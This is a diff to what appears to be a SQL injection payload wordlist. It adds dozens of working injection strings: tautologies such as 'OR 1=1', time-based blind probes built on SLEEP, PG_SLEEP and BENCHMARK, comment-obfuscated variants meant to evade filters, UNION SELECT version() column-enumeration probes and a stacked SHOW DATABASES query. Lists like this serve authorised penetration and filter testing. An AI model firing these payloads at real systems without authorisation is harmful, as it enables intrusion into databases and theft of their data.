@@ -1,5 +1,5 @@
-'
---ora_sqls
+
+'--ora_sqls
 #mysql
 '#mysql
  and 1=1
@@ -23,6 +23,8 @@
 ' and '2'='0'#mysql
 ' and '2'='2'-- oracle
 ' and '2'='0'-- oracle
+' || 1=1 #
+' OR 1 <=> #
 999999999999999999
 1e100
 2 or 2=2
@@ -39,4 +41,41 @@ or 1=1#
 " or 1=1#
 admin'#
 now()
-
+'OR SLEEP(4) #
+'OR PG_SLEEP(5) -- -
+)' OR 1 > 2
+)(' OR NOT 1 == 2
+'O/**//**/R/**/ /***/1=/**/1 /***/#
+'or 1=1 ---
+'oR 5432=6543 --
+'AnD 'x'='d ---
+'UnIon SElect NULL,NULL,NULL
+'ANd 8*8=64 --
+'Or NULL=NULL --
+'Or NoT NULL=NULL --
+'Or (6 * 6) - (2 - 2) = 36 --
+'Or 1 != 2 --
+'Or 1=1 != FALSE --
+'Or IF(6 = 6 AND (1 + 2 = 3), TRUE, FALSE) #
+'Or BENCHMARK(324, IF(2 = 2, TRUE, FALSE)) --
+'HavIng 1=1 --
+'oR 6543=6542 oR Having 1=1 --
+0' or 'a'='a
+' OR (SELECT COUNT(*) FROM demo) > 0 --
+' OR 10 BETWEEN 1 AND 20 --
+' OR version() LIKE '%MySQL%' --
+' oR (1) = (1)
+' oR 1 LIKE '1%'
+' oR 1 IN (1,'1') #
+' oR 999 aNd 'a' IN (5542, 999, 3211, 'a') --
+' oR 'z' nOt In ('a', 'b', 'c') --
+' oR TRUE = TRUE --
+' oR TRUE --
+' && 1=1 --
+' 9 * 5 --
+' UNiON SeLeCt version() ORDErBy 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40 --
+' UNiON SeLeCt version() ORDErBy 1,2,3,4,5,6,7,8,9,10 --
+' UNiON SeLeCt version() ORDErBy 1,2,3,4,5 --
+' UNiON SeLeCt version() ORDErBy 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 --
+' UNiON SeLeCt 1,2,3,4,version() gRoupBy 1,2,3,4,5 --
+;' SHOW DATABASES;
